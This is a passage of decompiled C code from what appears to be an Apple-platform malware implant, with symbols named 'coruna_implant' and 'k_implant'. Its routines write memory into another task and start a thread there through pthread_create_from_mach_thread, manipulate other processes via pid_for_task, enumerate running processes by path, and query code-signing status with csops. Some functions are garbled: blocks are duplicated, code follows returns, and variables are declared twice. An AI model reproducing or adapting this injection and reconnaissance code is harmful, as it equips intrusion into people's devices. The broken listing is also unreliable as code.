  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    u = coruna_implant65fc_via_ctx_free_11dc8_2(val[1]);
    if (1 < *(mach_port_name_t *)((long)val + 0x1c) + 1) {
      _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,
                         *(mach_port_name_t *)((long)val + 0x1c));
    }
    if (1 < *(mach_port_name_t *)(val + 4) + 1) {
      _mach_port_deallocate(*(ipc_space_t *)(val + 2),*(mach_port_name_t *)(val + 4));
    }
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





uint8_t * coruna_mach_port_deallocate_17b60(uint64_t *val,long handle,uint64_t id_2,long addr_2,int flags,
            uint32_t size)
{
  uint u;
  uint size;
  long *ptr;
  ipc_space_t task;
  uint8_t *ptr;
  uint64_t scratch;
  long bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  
  ptr = (uint8_t *)0xad001;
  if (((val != (uint64_t *)0x0) && (handle != 0)) && (addr_2 != 0)) {
    task = (ipc_space_t)id_2;
    if (task + 1 < 2) {
      ptr = &k_implant_rodata_word_1e009;
    }
    else {
      if (flags + 1U < 2) {
        host_info = host_info & 0xffffffffffffff00;
        size = coruna_csops_128d4(&host_info);
        if (size != 0) {
          u = 0x1e037;
          if (size != 0x12017) {
            u = size;
          }
          return (uint8_t *)(unsigned long)u;
        }
        if ((char)host_info != '\0') {
          return &k_implant_rodata_word_1e037;
        }
      }
      ptr = _calloc(1,0x28);
      if (ptr == (long *)0x0) {
        ptr = (uint8_t *)0xad009;
      }
      else {
        scratch = 0;
        ptr = (uint8_t *)coruna_mach_port_destroy((long)&scratch + 4,id_2,&scratch);
        if ((int)ptr == 0) {
          host_info = 0;
          thread_attr = 0;
          ptr = (uint8_t *)(**(void (**)(addr_2 + 0x18))(addr_2,0xf0000,&host_info,&thread_attr);
          if ((int)ptr == 0) {
            bootargs = 0;
            ptr = (uint8_t *)coruna_implant65fc_via_ctx_free_11dc8_3(handle,id_2,host_info,thread_attr,0,&bootargs);
            if ((int)ptr == 0) {
              *ptr = addr_2;
              ptr[1] = bootargs;
              *(mach_port_name_t *)((long)ptr + 0x1c) = scratch;
              *(mach_port_name_t *)(ptr + 4) = (mach_port_name_t)scratch;
              *(ipc_space_t *)(ptr + 2) = task;
              *(int *)((long)ptr + 0x14) = flags;
              *(uint32_t *)(ptr + 3) = size;
              *val = ptr;
              return ptr;
            }
          }
          _mach_port_deallocate(task,(mach_port_name_t)scratch);
          if (1 < scratch + 1) {
            _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
          }
        }
        _free(ptr);
      }
    }
  }
  return ptr;
}





uint8_t * coruna_pthread_attr_setdetachstate_17d10(long *handle,void *ctx,uint size,unsigned long arg,char *path,void *scratch,
            uint flags_2,uint32_t *size_x)
{
  uint u;
  uint32_t size;
  uint8_t *ptr;
  int err;
  uint version;
  int status;
  kern_return_t lk7;
  uint8_t *buf;
  long handle;
  uint64_t *data;
  void *ptr;
  size_t ls11;
  unsigned long port;
  uint64_t tag;
  unsigned long kind;
  unsigned long type_id;
  long *buf;
  long scratch;
  mach_vm_address_t bootargs;
  uint32_t thread_attr;
  mach_vm_address_t host_info;
  mach_vm_address_t serial_buf;
  uint action;
  void *block_ctx;
  uint stack_guard;
  void *sa_saved;
  long sa_new;
  long path_buf;
  pthread_attr_t tmp_buf;
  long region;
  
  region = *(long *)k_implant_stack_chk_guard_slot;
  if (((((handle == (long *)0x0) || (ctx == (void *)0x0)) || (size == 0)) ||
      ((path == (char *)0x0 || (*path == '\0')))) ||
     ((scratch == (void *)0x0) == (flags_2 != 0))) {
    buf = (uint8_t *)0xad001;
    if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return buf;
    }
    ___stack_chk_fail();
  }
  thread_attr = 0;
  port = arg >> 3 & 1;
  if (k_implant_rodata_word_1e900 <= *(double *)k_implant_dyldversionnumber_slot) {
    port = arg >> 3 & 1 | 2;
  }
  err = coruna_pid_for_task((int)handle[2],0xffffffec,&thread_attr);
  buf = (uint8_t *)coruna_mach_port_kernel_object((int)handle[2]);
  if (((int)buf == 0) && (buf = (uint8_t *)coruna_task_get_exc_guard_behavior((int)handle[2]), (int)buf == 0))
  {
    sa_new = 0;
    path_buf = 0;
    version = coruna_implant65fc_residual_111(handle[1],"_last",&path_buf);
    if (version == 0) {
      version = coruna_implant65fc_residual_111(handle[1],"_end",&sa_new);
    }
    if (((version == 0) && (path_buf != 0)) && (sa_new != 0)) {
      handle = handle[1];
      if (handle == 0) {
        buf = (uint8_t *)0xad001;
      }
      else {
        tag = *(uint64_t *)(handle + 0x40);
        size = *(uint32_t *)(handle + 0x48);
        sa_saved = (void *)0x0;
        stack_guard = 0;
        tmp_buf.__sig = 0;
        block_ctx = (void *)((unsigned long)block_ctx & 0xffffffff00000000);
        buf = (uint8_t *)coruna_implant65fc_residual_117(handle,&tmp_buf,&block_ctx);
        if ((int)buf == 0) {
          handle = handle[1];
          buf = (uint8_t *)0xad001;
          if (handle != 0) {
            buf = (uint8_t *)
                     coruna_implant65fc_via_ctx_clear_19f00(*(uint64_t *)(handle + 0x40),*(uint32_t *)(handle + 0x48),
                                  tmp_buf.__sig,(unsigned long)block_ctx & 0xffffffff,
                                  *(uint64_t *)(handle + 0xd8),*(uint32_t *)(handle + 0xe0),
                                  *(uint64_t *)(handle + 200),*(uint32_t *)(handle + 0xd0),
                                  *(uint64_t *)(handle + 0x140),&sa_saved,&stack_guard);
          }
          if ((void *)tmp_buf.__sig != (void *)0x0) {
            _free((void *)tmp_buf.__sig);
          }
          if ((int)buf == 0) {
            block_ctx = (void *)0x0;
            action = 0;
            buf = (uint8_t *)(**(void (**)(*handle + 0x20))(*handle,&block_ctx,&action);
            version = action;
            if ((int)buf == 0) {
              kind = (unsigned long)stack_guard;
              u = stack_guard + action + 0x90;
              type_id = (unsigned long)u;
              data = _calloc(1,type_id);
              if (data == (uint64_t *)0x0) {
                scratch = 0;
                bootargs = 0;
                u = 0;
                buf = (uint8_t *)0xad009;
              }
              else {
                host_info = 0;
                serial_buf = 0;
                _memcpy(data + 0x12,sa_saved,kind);
                _memcpy((void *)((long)data + (unsigned long)(stack_guard + 0x90)),block_ctx,(unsigned long)action);
                *data = tag;
                *(uint32_t *)(data + 1) = size;
                data[2] = 0;
                *(uint *)(data + 3) = u;
                data[4] = tag;
                *(uint32_t *)(data + 5) = size;
                *(uint32_t *)(data + 6) = 0x90;
                *(uint *)((long)data + 0x34) = stack_guard;
                handle = handle[4];
                data[8] = sa_new;
                *(uint *)(data + 9) = stack_guard + 0x90;
                *(uint *)((long)data + 0x4c) = action;
                *(int *)(data + 10) = (int)handle;
                data[0xb] = port;
                handle = _dlsym(0xfffffffffffffffe,"pthread_create_from_mach_thread");
                buf = data + 0xc;
                *buf = handle;
                if (handle == 0) {
                  buf = (uint8_t *)0x12001;
done:
                  if (data[2] != 0) {
                    coruna_mach_vm_deallocate_1b998((int)handle[2],serial_buf,type_id,1);
                  }
                  if (*buf != 0) {
                    coruna_mach_vm_deallocate_1b998((int)handle[2],host_info,0x38,1);
                  }
                  scratch = 0;
                  bootargs = 0;
                  u = 0;
                }
                else {
                  buf = (uint8_t *)coruna_implant65fc_via_return_zero_6098(handle[1],buf);
                  if (((int)buf != 0) ||
                     (buf = (uint8_t *)coruna_mach_vm_allocate((int)handle[2],0x38,1,&host_info),
                     (int)buf != 0)) goto done;
                  tmp_buf.__opaque[0x20] = '\0';
                  tmp_buf.__opaque[0x21] = '\0';
                  tmp_buf.__opaque[0x22] = '\0';
                  tmp_buf.__opaque[0x23] = '\0';
                  tmp_buf.__opaque[0x24] = '\0';
                  tmp_buf.__opaque[0x25] = '\0';
                  tmp_buf.__opaque[0x26] = '\0';
                  tmp_buf.__opaque[0x27] = '\0';
                  tmp_buf.__opaque[0x18] = '\0';
                  tmp_buf.__opaque[0x19] = '\0';
                  tmp_buf.__opaque[0x1a] = '\0';
                  tmp_buf.__opaque[0x1b] = '\0';
                  tmp_buf.__opaque[0x1c] = '\0';
                  tmp_buf.__opaque[0x1d] = '\0';
                  tmp_buf.__opaque[0x1e] = '\0';
                  tmp_buf.__opaque[0x1f] = '\0';
                  tmp_buf.__opaque[0x30] = '\0';
                  tmp_buf.__opaque[0x31] = '\0';
                  tmp_buf.__opaque[0x32] = '\0';
                  tmp_buf.__opaque[0x33] = '\0';
                  tmp_buf.__opaque[0x34] = '\0';
                  tmp_buf.__opaque[0x35] = '\0';
                  tmp_buf.__opaque[0x36] = '\0';
                  tmp_buf.__opaque[0x37] = '\0';
                  tmp_buf.__opaque[0x28] = '\0';
                  tmp_buf.__opaque[0x29] = '\0';
                  tmp_buf.__opaque[0x2a] = '\0';
                  tmp_buf.__opaque[0x2b] = '\0';
                  tmp_buf.__opaque[0x2c] = '\0';
                  tmp_buf.__opaque[0x2d] = '\0';
                  tmp_buf.__opaque[0x2e] = '\0';
                  tmp_buf.__opaque[0x2f] = '\0';
                  tmp_buf.__opaque[0] = '\0';
                  tmp_buf.__opaque[1] = '\0';
                  tmp_buf.__opaque[2] = '\0';
                  tmp_buf.__opaque[3] = '\0';
                  tmp_buf.__opaque[4] = '\0';
                  tmp_buf.__opaque[5] = '\0';
                  tmp_buf.__opaque[6] = '\0';
                  tmp_buf.__opaque[7] = '\0';
                  tmp_buf.__sig = 0;
                  tmp_buf.__opaque[0x10] = '\0';
                  tmp_buf.__opaque[0x11] = '\0';
                  tmp_buf.__opaque[0x12] = '\0';
                  tmp_buf.__opaque[0x13] = '\0';
                  tmp_buf.__opaque[0x14] = '\0';
                  tmp_buf.__opaque[0x15] = '\0';
                  tmp_buf.__opaque[0x16] = '\0';
                  tmp_buf.__opaque[0x17] = '\0';
                  tmp_buf.__opaque[8] = '\0';
                  tmp_buf.__opaque[9] = '\0';
                  tmp_buf.__opaque[10] = '\0';
                  tmp_buf.__opaque[0xb] = '\0';
                  tmp_buf.__opaque[0xc] = '\0';
                  tmp_buf.__opaque[0xd] = '\0';
                  tmp_buf.__opaque[0xe] = '\0';
                  tmp_buf.__opaque[0xf] = '\0';
                  _pthread_attr_init(&tmp_buf);
                  status = _pthread_attr_setdetachstate(&tmp_buf,2);
                  if ((status != 0) ||
                     (lk7 = _mach_vm_write(*(vm_map_t *)(handle + 2),host_info,
                                             (vm_offset_t)&tmp_buf,0x38), lk7 != 0)) {
                    _pthread_attr_destroy(&tmp_buf);
                    buf = (uint8_t *)0xad00b;
                    goto done;
                  }
                  data[0xe] = host_info;
                  *(uint32_t *)(data + 0xf) = 0x38;
                  _pthread_attr_destroy(&tmp_buf);
                  buf = (uint8_t *)coruna_mach_vm_allocate((int)handle[2],type_id,0x3000001,&serial_buf);
                  if ((int)buf != 0) goto done;
                  data[2] = serial_buf;
                  lk7 = _mach_vm_write(*(vm_map_t *)(handle + 2),serial_buf,(vm_offset_t)data,u
                                        );
                  if (lk7 != 0) {
                    buf = &UNK_0001e01a;
                    goto done;
                  }
                  buf = (uint8_t *)0x0;
                  bootargs = serial_buf;
                  scratch = path_buf;
                }
                _bzero(data,type_id);
                _free(data);
                version = action;
              }
              _bzero(block_ctx,(unsigned long)version);
              _free(block_ctx);
            }
            else {
              scratch = 0;
              bootargs = 0;
              u = 0;
            }
            _bzero(sa_saved,(unsigned long)stack_guard);
            _free(sa_saved);
            if ((int)buf == 0) {
              buf = (uint8_t *)
                       coruna_implant65fc_via_mach_port_deallocate_1c3fc(handle[1],scratch,bootargs,u,(int)handle[4]);
              if ((int)buf == 0) {
                if (handle[1] != 0) {
                  *(uint8_t *)(handle[1] + 0xfb) = 0;
                }
                *(uint32_t *)(handle + 4) = 0;
                buf = (uint8_t *)coruna_mach_port_deallocate_1857c(handle,&k_implant_slot_4e20,3,0);
                if ((int)buf == 0) {
                  tmp_buf.__sig = tmp_buf.__sig & 0xffffffff00000000;
                  buf = (uint8_t *)coruna_mach_port_deallocate_1857c(handle,30000,8,&tmp_buf);
                  if ((int)buf == 0) {
                    port = (unsigned long)(size + 0x43 & 0xfffffffc);
                    ptr = _calloc(1,port);
                    if (ptr == (void *)0x0) {
                      buf = (uint8_t *)0xad009;
                    }
                    else {
                      *(uint64_t *)((long)ptr + 0x14) = 0x100000001;
                      status = *(int *)((long)handle + 0x14);
                      if (1 < status + 1U) {
                        *(uint32_t *)((long)ptr + 0x24) = 0x130000;
                        *(int *)((long)ptr + 0x1c) = status;
                      }
                      *(int *)((long)ptr + 0x38) = (int)handle[3];
                      *(uint *)((long)ptr + 0x3c) = size;
                      *(unsigned long *)((long)ptr + 0x30) = arg;
                      _memcpy((void *)((long)ptr + 0x40),ctx,(unsigned long)size);
                      buf = (uint8_t *)
                               coruna_mach_msg_destroy(tmp_buf.__sig & 0xffffffff,ptr,port,30000,1);
                      _bzero(ptr,port);
                      _free(ptr);
                    }
                    ptr = k_implant_mach_task_self_slot;
                    _mach_port_deallocate
                              (*(ipc_space_t *)k_implant_mach_task_self_slot,
                               (mach_port_name_t)tmp_buf.__sig);
                    if (((int)buf == 0) &&
                       ((flags_2 == 0 || (buf = (uint8_t *)0xad001, scratch != (void *)0x0))))
                    {
                      ls11 = _strlen(path);
                      if (ls11 - 1 < 0x3fe) {
                        tmp_buf.__sig = tmp_buf.__sig & 0xffffffff00000000;
                        buf = (uint8_t *)coruna_mach_port_deallocate_1857c(handle,30000,9,&tmp_buf);
                        if ((int)buf == 0) {
                          port = (unsigned long)(flags_2 + (int)ls11 + 0x24 & 0xfffffffc);
                          ptr = _calloc(1,port);
                          if (ptr == (void *)0x0) {
                            buf = (uint8_t *)0xad009;
                          }
                          else {
                            *(uint32_t *)((long)ptr + 0x14) = 2;
                            *(int *)((long)ptr + 0x18) = (int)(ls11 + 1);
                            *(uint *)((long)ptr + 0x1c) = flags_2;
                            _memcpy((void *)((long)ptr + 0x20),path,ls11 + 1);
                            if (flags_2 != 0) {
                              _memcpy((void *)((long)ptr + ls11 + 0x21),scratch,(unsigned long)flags_2
                                     );
                            }
                            buf = (uint8_t *)
                                     coruna_mach_msg_destroy(tmp_buf.__sig & 0xffffffff,ptr,port,30000,0
                                                 );
                            _bzero(ptr,port);
                            _free(ptr);
                          }
                          _mach_port_deallocate
                                    (*(ipc_space_t *)ptr,(mach_port_name_t)tmp_buf.__sig);
                          if (((int)buf == 0) &&
                             (buf = (uint8_t *)coruna_mach_port_deallocate_1857c(handle,&k_implant_slot_4e20,10,0),
                             (int)buf == 0)) {
                            if (size_x == (uint32_t *)0x0) {
                              _mach_port_mod_refs(*(ipc_space_t *)ptr,
                                                  *(mach_port_name_t *)((long)handle + 0x1c),1,-1);
                            }
                            else {
                              *size_x = *(uint32_t *)((long)handle + 0x1c);
                            }
                            buf = (uint8_t *)0x0;
                            *(uint32_t *)((long)handle + 0x1c) = 0;
                          }
                        }
                      }
                      else {
                        buf = &k_implant_rodata_word_1e010;
                      }
                    }
                  }
                }
              }
              else {
                coruna_mach_vm_deallocate_1b998((int)handle[2],bootargs,u,1);
              }
            }
          }
        }
      }
    }
    else {
      u = 0x12001;
      if (version != 0) {
        u = version;
      }
      buf = (uint8_t *)(unsigned long)u;
    }
  }
  if (err == 0) {
    coruna_pid_for_task((int)handle[2],thread_attr,0);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return buf;
  }
  ___stack_chk_fail();
}





uint coruna_pid_for_task(mach_port_name_t arg,int flags,int *count_2)
{
  uint u;
  int err;
  int status;
  int *err;
  uint *ptr;
  id_t scratch;
  
  scratch = 0xffffffff;
  u = 0xad001;
  if (((1 < arg + 1) && (-0x15 < flags)) && (flags < 0x15)) {
    u = _pid_for_task(arg,(int *)&scratch);
    if (u == 0) {
      err = ___error();
      *err = 0;
      err = _getpriority(0,scratch);
      err = ___error();
      if (((*err == 0) || (err != -1)) &&
         (status = _setpriority(0,scratch,flags), status == 0)) {
        u = 0;
        if (count_2 != (int *)0x0) {
          *count_2 = err;
        }
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        u = -*ptr;
        if (-1 < err) {
          u = *ptr;
        }
        u = u | 0x40000000;
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





uint8_t * coruna_mach_port_deallocate_1857c(long handle,uint64_t val,int flags,mach_port_name_t *arg)
{
  uint u;
  mach_port_name_t *lpm2;
  uint8_t *ptr;
  mach_port_name_t scratch;
  uint64_t bootargs;
  
  if (handle == 0) {
    ptr = (uint8_t *)0xad001;
  }
  else {
    bootargs = 0;
    scratch = 0;
    lpm2 = (mach_port_name_t *)0x0;
    if (arg != (mach_port_name_t *)0x0) {
      lpm2 = &scratch;
    }
    ptr = (uint8_t *)
             coruna_mach_port_deallocate_1865c(*(uint32_t *)(handle + 0x1c),val,(long)&bootargs + 4,&bootargs,
                          lpm2);
    if ((int)ptr == 0) {
      ptr = (uint8_t *)(bootargs & 0xffffffff);
      if ((int)bootargs == 0) {
        u = 0x1e040;
        if (bootargs == flags) {
          u = 0;
        }
        ptr = (uint8_t *)(unsigned long)u;
        if ((bootargs == flags) && (arg != (mach_port_name_t *)0x0)) {
          ptr = &UNK_0001e036;
          if (1 < scratch + 1) {
            ptr = (uint8_t *)0x0;
            *arg = scratch;
            scratch = 0;
          }
        }
      }
      if (1 < scratch + 1) {
        _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
      }
    }
  }
  return ptr;
}





uint8_t * coruna_mach_port_deallocate_1865c(uint64_t val,uint64_t id_2,uint32_t *size,uint32_t *flags_2,
            uint32_t *version_3)
{
  void *ptr;
  uint8_t *ptr;
  
  if ((int)val + 1U < 2) {
    ptr = &k_implant_rodata_word_1e01b;
  }
  else {
    ptr = _calloc(1,0x28);
    if (ptr == (void *)0x0) {
      ptr = (uint8_t *)0xad009;
    }
    else {
      ptr = (uint8_t *)coruna_mach_msg_destroy_19b70(val,5,0x28,ptr,id_2);
      if ((int)ptr == 0) {
        if (*(int *)((long)ptr + 0x14) == 5) {
          ptr = &UNK_0001e038;
          if (*(int *)((long)ptr + 4) == 0x20) {
            if (size != (uint32_t *)0x0) {
              *size = *(uint32_t *)((long)ptr + 0x18);
            }
            if (flags_2 != (uint32_t *)0x0) {
              *flags_2 = *(uint32_t *)((long)ptr + 0x1c);
            }
            ptr = (uint8_t *)0x0;
            if (version_3 != (uint32_t *)0x0) {
              *version_3 = *(uint32_t *)((long)ptr + 8);
              *(uint32_t *)((long)ptr + 8) = 0;
            }
          }
        }
        else {
          ptr = &UNK_0001e038;
        }
      }
      if (1 < *(mach_port_name_t *)((long)ptr + 8) + 1) {
        _mach_port_deallocate
                  (*(ipc_space_t *)k_implant_mach_task_self_slot,
                   *(mach_port_name_t *)((long)ptr + 8));
      }
      _free(ptr);
    }
  }
  return ptr;
}





uint8_t * coruna_mach_port_destroy(mach_port_name_t *arg,uint64_t val,long handle)
{
  uint8_t *ptr;
  mach_port_name_t scratch;
  
  ptr = (uint8_t *)0xad001;
  if ((arg != (mach_port_name_t *)0x0) && (handle != 0)) {
    if ((int)val + 1U < 2) {
      ptr = &k_implant_rodata_word_1e009;
    }
    else {
      scratch = 0;
      ptr = (uint8_t *)coruna_mach_port_allocate(&scratch,5);
      if ((int)ptr == 0) {
        ptr = (uint8_t *)coruna_mach_port_insert_right(scratch,val,handle);
        if ((int)ptr == 0) {
          *arg = scratch;
        }
        else if (1 < scratch + 1) {
          _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
        }
      }
    }
  }
  return ptr;
}
uint8_t * coruna_realpath(uint64_t val,uint64_t id_2,uint32_t *size)
{
  uint u;
  uint64_t size;
  bool err;
  int err;
  char *ptr;
  char *buf;
  size_t ls7;
  void *ptr;
  char *str;
  uint8_t *ptr;
  unsigned long version;
  long handle;
  unsigned long port;
  uint8_t tag[16];
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  uint64_t *block_ctx;
  char *stack_guard;
  byte sa_saved;
  byte sa_new;
  byte path_buf;
  uint64_t tmp_buf;
  uint64_t *region;
  uint64_t plist;
  uint32_t url_buf;
  uint64_t json_buf;
  uint64_t *frame;
  uint64_t work;
  uint32_t cache;
  uint64_t cache_20;
  uint64_t *cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t scratch;
  uint8_t *cache_24;
  uint64_t cache_25;
  void (*cache_26)(void);
  uint8_t *cache_27;
  uint8_t **cache_28;
  uint8_t *cache_29;
  size_t cache_30;
  uint8_t cache_31[4096];
  uint64_t cache_32;
  uint64_t bootargs;
  long cache_33;
  
  tag = (*(void (*)k_implant_chkstk_darwin_slot)();
  ptr = tag;
  cache_33 = *(long *)k_implant_stack_chk_guard_slot;
  if ((ptr == (char *)0x0) || (*ptr == '\0' || size == (uint32_t *)0x0)) {
    u = 0xad001;
    if (size != (uint32_t *)0x0) {
      u = 0x1e03f;
    }
    ptr = (uint8_t *)(unsigned long)u;
    if (*(long *)k_implant_stack_chk_guard_slot == cache_33) {
    return ptr;
    }
    ___stack_chk_fail();
  }
  if ((tag & 1) == 0) {
    buf = _strrchr(ptr,0x2f);
    if (buf != (char *)0x0) {
      ptr = buf + 1;
    }
    if (*ptr == '\0') {
done:
      ptr = &k_implant_rodata_word_1e03f;
      if (*(long *)k_implant_stack_chk_guard_slot == cache_33) {
      return ptr;
      }
      ___stack_chk_fail();
    }
    str = (char *)0x0;
    buf = ptr;
  }
  else {
    str = (char *)_realpath_DARWIN_EXTSN(ptr,0);
    buf = str;
    if (str == (char *)0x0) {
      if (*ptr == '\0') goto done;
      str = (char *)0x0;
      buf = ptr;
    }
  }
  ptr = k_implant_nsconcretestackblock_slot;
  size = k_implant_rodata_word_1e8c8;
  sa_saved = ~tag[8] & 1;
  action = &cache_20;
  cache_20 = 0;
  u = tag & 0xff;
  cache_22 = k_implant_rodata_word_1e908;
  path_buf = ((byte)(u >> 2) ^ 0xff) & 1;
  sa_new = ((byte)(u >> 1) ^ 0xff) & 1;
  cache_23 = 0;
  scratch = 0;
  block_ctx = &json_buf;
  json_buf = 0;
  work = k_implant_rodata_word_1e8c0;
  cache = 0;
  serial_buf = &tmp_buf;
  tmp_buf = 0;
  plist = k_implant_rodata_word_1e8c0;
  url_buf = 0;
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_rodata_word_1e8c8;
  thread_attr = coruna_strrchr;
  host_info = &k_implant_rodata_word_20500;
  stack_guard = buf;
  region = serial_buf;
  frame = block_ctx;
  cache_21 = action;
  _bzero(cache_31,0x1000);
  cache_24 = ptr;
  cache_25 = size;
  cache_26 = coruna_proc_pidpath;
  cache_27 = &k_implant_rodata_word_20530;
  cache_28 = &scratch;
  bootargs = k_implant_rodata_word_0001e918;
  cache_32 = k_implant_rodata_word_1e910;
  cache_30 = 0;
  cache_29 = cache_31;
  err = _sysctl((int *)&cache_32,4,(void *)0x0,&cache_30,(void *)0x0,0);
  if ((err == 0) && (cache_30 != 0)) {
    cache_30 = cache_30 << 1;
    ptr = _malloc(cache_30);
    ptr = (uint8_t *)0xad00b;
    }
    __Block_object_dispose(&tmp_buf,8);
    __Block_object_dispose(&json_buf,8);
    __Block_object_dispose(&cache_20,8);
    if (str != (char *)0x0) {
    ls7 = _strlen(str);
    if (ls7 != 0) {
    _bzero(str,ls7);
    }
    _free(str);
    }
    fail:
    if (*(long *)k_implant_stack_chk_guard_slot == cache_33) {
    return ptr;
    err = _sysctl((int *)&cache_32,4,ptr,&cache_30,(void *)0x0,0);
    if ((err == 0) && (cache_30 != 0)) {
      version = cache_30 / 0x288;
      if ((int)version == 0) {
        ptr = (uint8_t *)0x0;
      }
      else {
        ptr = (uint8_t *)coruna_proc_pidpath(&cache_24,ptr);
        if (((((int)ptr == 0) && (version = version & 0xffffffff, 1 < version)) &&
            (ptr = (uint8_t *)coruna_proc_pidpath(&cache_24,(long)ptr + 0x288),
            (int)ptr == 0)) && (2 < version)) {
          handle = (long)ptr + 0x510;
          port = 3;
          do {
            ptr = (uint8_t *)(*cache_26)(&cache_24,handle);
            handle = handle + 0x288;
            err = port < version;
            port = port + 1;
          } while ((int)ptr == 0 && err);
        }
      }
    }
    else {
      ptr = (uint8_t *)0xad00b;
    }
    _bzero(ptr,cache_30);
    _free(ptr);
    if ((int)ptr == 0) {
      if (*(int *)(region + 3) == 0) {
        ptr = (uint8_t *)0xad011;
      }
      else {
        ptr = (uint8_t *)0x0;
        *size = *(uint32_t *)(frame + 3);
      }
    }
  }
  else {
cleanup:
    ptr = (uint8_t *)0xad00b;
  }
  __Block_object_dispose(&tmp_buf,8);
  __Block_object_dispose(&json_buf,8);
  __Block_object_dispose(&cache_20,8);
  if (str != (char *)0x0) {
    ls7 = _strlen(str);
    if (ls7 != 0) {
      _bzero(str,ls7);
    }
    _free(str);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == cache_33) {
    return ptr;
  }
  ___stack_chk_fail();
}





uint8_t * coruna_strrchr(long handle,long *addr_2,char *path)
{
  int err;
  char *ptr;
  long handle;
  long addr;
  long off;
  
  if (*(char *)(handle + 0x40) != '\0') {
    if (path == (char *)0x0) {
      return (uint8_t *)0x0;
    }
    ptr = _strrchr(path,0x2f);
    if (ptr != (char *)0x0) {
      path = ptr + 1;
    }
  }
  if (path == (char *)0x0) {
    return (uint8_t *)0x0;
  }
  if (addr_2 == (long *)0x0) {
    return (uint8_t *)0x0;
  }
  err = _strcmp(*(char **)(handle + 0x38),path);
  if ((err == 0) && (0 < (int)addr_2[5])) {
    handle = *(long *)(*(long *)(handle + 0x20) + 8);
    *(int *)(handle + 0x18) = *(int *)(handle + 0x18) + 1;
    if ((1 < *(uint *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18)) &&
       (*(char *)(handle + 0x41) == '\0')) {
      return &k_implant_rodata_word_1e03e;
    }
    if (*(char *)(handle + 0x42) == '\0') {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      off = *(long *)(handle + 0x18);
      if ((off == 0) && (*(int *)(handle + 0x20) == 0)) {
        addr = *addr_2;
      }
      else {
        addr = *addr_2;
        if (off <= addr) {
          if (addr != off) {
            return (uint8_t *)0x0;
          }
          addr = off;
          if (*(int *)(handle + 0x20) <= (int)addr_2[1]) {
            return (uint8_t *)0x0;
          }
        }
      }
    }
    else {
      addr = *addr_2;
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (addr <= *(long *)(handle + 0x18)) {
        if (addr != *(long *)(handle + 0x18)) {
          return (uint8_t *)0x0;
        }
        if ((int)addr_2[1] <= *(int *)(handle + 0x20)) {
          return (uint8_t *)0x0;
        }
      }
    }
    *(long *)(handle + 0x18) = addr;
    *(int *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x20) = (int)addr_2[1];
    *(int *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = (int)addr_2[5];
    return (uint8_t *)0x0;
  }
  return (uint8_t *)0x0;
}





uint64_t coruna_proc_pidpath(long handle,long addr_2)
{
  int err;
  uint64_t u;
  uint64_t *ptr;
  uint64_t size;
  
  if (0 < *(int *)(addr_2 + 0x28)) {
    err = _proc_pidpath(*(int *)(addr_2 + 0x28),*(void **)(handle + 0x28),0x1000);
    if (0 < err) {
      u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))
                        (*(long *)(handle + 0x20),addr_2,*(uint64_t *)(handle + 0x28));
      return u;
    }
    ptr = *(uint64_t **)(handle + 0x28);
    size = *(uint64_t *)(addr_2 + 0xfb);
    u = *(uint64_t *)(addr_2 + 0xf3);
    *(uint8_t *)(ptr + 2) = *(uint8_t *)(addr_2 + 0x103);
    ptr[1] = size;
    *ptr = u;
    *(uint8_t *)(*(long *)(handle + 0x28) + 0x11) = 0;
  }
  return 0;
}





int coruna_ctx_free_18dac(uint64_t *val)
{
  int err;
  int status;
  void *ptr;
  
  if (val == (uint64_t *)0x0) {
    err = 0xad001;
  }
  else {
    ptr = (void *)val[6];
    if (ptr != (void *)0x0) {
      coruna_objc_msgsend_19a08(ptr);
      _free(ptr);
    }
    err = coruna_rwlock_iface_destroy(val[5]);
    status = coruna_mach_port_deallocate_1adbc(val[3]);
    if (err != 0) {
      status = err;
    }
    err = status;
    if ((*(char *)(val + 1) != '\0') && (err = coruna_ctx_free_129d0(*val), status != 0)) {
      err = status;
    }
    val[6] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
  }
  return err;
}





uint8_t * coruna_csops_18e40(uint64_t *val,short *arg,long handle,short *arg)
{
  uint u;
  pid_t lp2;
  int err;
  uint8_t *ptr;
  int *err;
  uint *buf;
  long *ptr;
  uint64_t *str;
  int status;
  unsigned long scratch;
  uint32_t bootargs;
  uint8_t thread_attr[4];
  int *host_info;
  uint64_t scratch;
  uint32_t serial_buf;
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  bootargs = 0;
  scratch = 0;
  ptr = (uint8_t *)coruna_host_kernel_version(&scratch);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
  return ptr;
  }
  ___stack_chk_fail();
  _getpid();
  host_info = (int *)0x0;
  scratch = 0;
  serial_buf = 0;
  if (k_implant_rodata_word_1e888 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp2 = _getpid();
    err = _csops(lp2,0,thread_attr,4);
    if (-1 < err) goto done;
  }
  else {
    lp2 = _getpid();
    err = _csops(lp2,5,&host_info,0x14);
    if ((-1 < err) || (err = ___error(), *err == 0x55)) {
done:
      ptr = (uint8_t *)0xad001;
